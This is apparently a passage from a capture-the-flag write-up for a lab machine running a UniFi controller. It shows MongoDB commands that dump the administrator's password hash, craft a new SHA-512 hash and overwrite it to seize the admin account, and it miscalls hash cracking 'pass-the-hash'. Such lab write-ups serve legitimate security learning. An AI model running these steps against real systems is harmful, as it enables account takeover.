

We are currently in the non-relational MongoDB Database, let's try to achieve any impact from it. Firstly we list all available databases:
``` json 
mongo --port 27117 --eval "db.adminCommand('listDatabases')"
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27117/
MongoDB server version: 3.6.3
{
	"databases" : [
		{
			"name" : "ace",
			"sizeOnDisk" : 1998848,
			"empty" : false
		{
			"name" : "admin",
			"sizeOnDisk" : 32768,
			"empty" : false
		},
	
	],
	"totalSize" : 2355200,
	"ok"
```
Result is - `ace` (default DB name of our target (unifi network). according to the manual) and `admin`, with which we can't interact.

```json
--eval //execute javascript code
"db.adminCommand('listDatabases')" //method which sends administrative command
('listDatabases')" //requested command (we need listDatabases permission before)
```

After selecting database, we look for admin's credentials:
``` json
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27117/ace
MongoDB server version: 3.6.3
{
	"_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
	"name" : "administrator",
	"email" : "administrator@unified.htb",
	"x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
	"time_created" : NumberLong(1640900495),
	"last_site_name" : "default",
	"ui_settings" : {
```

```json
"_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
"x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
```
Gives us all comprehensive information - user's id and its hashed password.  We can try to decrypt it using `john-the-ripper` (performing pass-the-hash attack), but firstly we can try to make our own password for user `administrator` and replace it.

`$6$` in the beginning of password indicates hash type - `SHA-512`

we can make our new password using `openssl` tool with option `passwd` and hash identifier number.
``` bash
openssl passwd -6 "our new password"                                               [git:main] ✖  
$6$N87uYbP5wQoGsCjX$8164aJaox1hVPdLx9fDEdkZh.1Dm.R/Dz.6Yxfp5SSpYcFyhOWLufMrH2PwfxY8jzHkRIadmfz88mQbhaS2q/.
```

or mkpassswd utility:
```bash
mkpasswd -m sha-512 "our new password"  
```

All that's left is to simply replace the password with our new-crafted:
``` json
mongo --port 27117 ace --eval 'db.admin.update({"_id":
ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$N87uYbP5wQoGsCjX$8164aJaox1hVPdLx9fDEdkZh.1Dm.R/Dz.6Yxfp5SSpYcFyhOWLufMrH2PwfxY8jzHkRIadmfz88mQbhaS2q/."}})'
```

Result:
``` json
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27117/ace
MongoDB server version: 3.6.3
{
	"_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
	"name" : "administrator",
	"email" : "administrator@unified.htb",
	"x_shadow" : "$6$N87uYbP5wQoGsCjX$8164aJaox1hVPdLx9fDEdkZh.1Dm.R/Dz.6Yxfp5SSpYcFyhOWLufMrH2PwfxY8jzHkRIadmfz88mQbhaS2q/.",
